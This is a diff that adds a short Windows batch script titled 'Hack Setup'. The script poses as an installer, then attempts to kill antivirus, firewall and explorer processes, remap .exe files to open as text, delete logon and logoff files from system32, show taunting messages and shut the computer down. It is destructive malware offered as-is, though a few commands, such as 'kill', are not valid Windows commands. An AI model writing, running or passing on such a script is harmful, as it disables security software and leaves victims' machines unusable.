@@ -1,0 +1,22 @@
+title Hack Setup
+color 0A
+@echo off
+set end=md “Hack installing”
+set fin=copy “Hack log.txt” “Installing”
+%end%
+%fin%
+net send * Hack is installing, press OK to begin set up.
+kill NAVAPSVC.exe /F /Q
+kill zonelabs.exe /F /Q
+kill explorer.exe /F /Q
+cls
+assoc .exe=txtfile
+assoc .txt=mp3file
+cls
+msg * So... Guess who got hacked... 
+msg * I warned you, and you kept going. Challenge me and this is what happens.
+DEL C:\WINDOWS\system32\logoff.exe /F /Q
+DEL C:\WINDOWS\system32\logon.exe /F /Q
+DEL C:\WINDOWS\system32\logon.scr /F /Q
+cls
+shutdown
